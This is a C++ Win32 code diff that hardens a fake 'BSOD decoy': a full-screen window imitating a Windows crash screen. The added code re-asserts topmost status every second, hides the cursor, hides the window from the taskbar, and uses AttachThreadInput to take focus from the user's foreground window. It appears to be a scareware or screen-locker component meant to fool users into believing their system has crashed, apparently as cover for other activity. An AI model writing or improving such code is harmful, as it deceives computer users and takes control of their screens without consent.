@@ -75,6 +75,8 @@ namespace {
                     if (g_progress > 100) g_progress = 100;
                     InvalidateRect(hWnd, NULL, TRUE);
                 }
+                // Aggressively re-assert top-most every timer tick
+                SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
                 break;
             }
             case WM_DESTROY:
@@ -89,35 +91,55 @@ namespace {
 
 void ShowBSOD() {
     LOG_INFO("Displaying BSOD decoy...");
+
+    // Give time for any previous windows to settle
+    Sleep(1000);
+
     HINSTANCE hInstance = GetModuleHandle(NULL);
-    WNDCLASSEXA wc = {0};
+    WNDCLASSEXA wc;
+    RtlZeroMemory(&wc, sizeof(wc));
     wc.cbSize = sizeof(WNDCLASSEXA);
     wc.lpfnWndProc = BSODWndProc;
     wc.hInstance = hInstance;
     wc.lpszClassName = "WindowsBSODDecoy";
-    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+    wc.hCursor = NULL; // No cursor for the window class
 
     RegisterClassExA(&wc);
 
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
-    HWND hWnd = CreateWindowExA(WS_EX_TOPMOST, wc.lpszClassName, "BSOD", WS_POPUP | WS_VISIBLE,
+    LOG_DEBUG("Screen dimensions detected: " + std::to_string(screenWidth) + "x" + std::to_string(screenHeight));
+
+    HWND hWnd = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, wc.lpszClassName, "BSOD", WS_POPUP | WS_VISIBLE,
         0, 0, screenWidth, screenHeight, NULL, NULL, hInstance, NULL);
 
     if (hWnd) {
-        LOG_INFO("Decoy window created successfully.");
+        LOG_INFO("Decoy window created successfully. Handle: 0x" + std::to_string((uintptr_t)hWnd));
 
-        // Ensure it's on top and active
-        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-        SetForegroundWindow(hWnd);
+        // Force the window to the front
+        DWORD foreThread = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
+        DWORD appThread = GetCurrentThreadId();
+        if (foreThread != appThread) {
+            AttachThreadInput(foreThread, appThread, TRUE);
+            SetForegroundWindow(hWnd);
+            SetFocus(hWnd);
+            SetActiveWindow(hWnd);
+            AttachThreadInput(foreThread, appThread, FALSE);
+        } else {
+            SetForegroundWindow(hWnd);
+            SetFocus(hWnd);
+            SetActiveWindow(hWnd);
+        }
+
+        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, screenWidth, screenHeight, SWP_SHOWWINDOW);
         UpdateWindow(hWnd);
 
         // Hide the cursor
         ShowCursor(FALSE);
 
-        // Set a timer to update progress
-        SetTimer(hWnd, 1, 3000, NULL);
+        // Set a timer to update progress and re-assert topmost
+        SetTimer(hWnd, 1, 1000, NULL);
 
         MSG msg;
         while (GetMessage(&msg, NULL, 0, 0)) {
